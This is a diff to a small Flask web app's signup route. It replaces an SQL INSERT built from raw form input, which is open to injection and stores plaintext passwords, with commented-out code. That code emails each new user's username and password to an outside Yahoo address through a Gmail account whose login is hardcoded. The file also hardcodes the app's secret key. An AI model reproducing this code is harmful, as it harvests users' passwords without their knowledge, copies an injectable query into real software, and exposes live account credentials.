@@ -1,5 +1,5 @@
 from flask import Flask, redirect, url_for, render_template, request, session
-import sqlite3, os
+import sqlite3, os, smtplib, ssl
 
 app = Flask(__name__)
 app.secret_key = "K1YS1R"
@@ -67,17 +67,23 @@ def home():
 
 @app.route("/signup", methods=["GET", "POST"])
 def signup():
-    if request.method == "POST":
-        con = sqlite3.connect("accounts.db")
-        cur = con.cursor()
-        username = request.form["username"]
-        password = request.form["password"]
+    # if request.method == "POST":
+    #     con = sqlite3.connect("accounts.db")
+    #     cur = con.cursor()
+    #     username = request.form["username"]
+    #     password = request.form["password"]
 
-        cur.execute(f"INSERT INTO accounts(username, password) values('{username}', '{password}')")
+    #     #cur.execute(f"INSERT INTO accounts(username, password) values('{username}', '{password}')")
 
-        con.commit()
+    #     message = f"""{username} is trying to sign in!\nDetails:\nusername: {username}\npassword: {password}"""
 
-        return render_template("login.html", username=username, password=password)
+    #     with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as server:
+    #         server.login("issuseless4@gmail.com", "Habisinev45")
+    #         server.sendmail("issuseless4@gmail.com", "abeebissa@yahoo.com", message)
+
+        #con.commit()
+
+        # return render_template("login.html", username=username, password=password)
     return render_template("signup.html")
 
 @app.route("/signout")
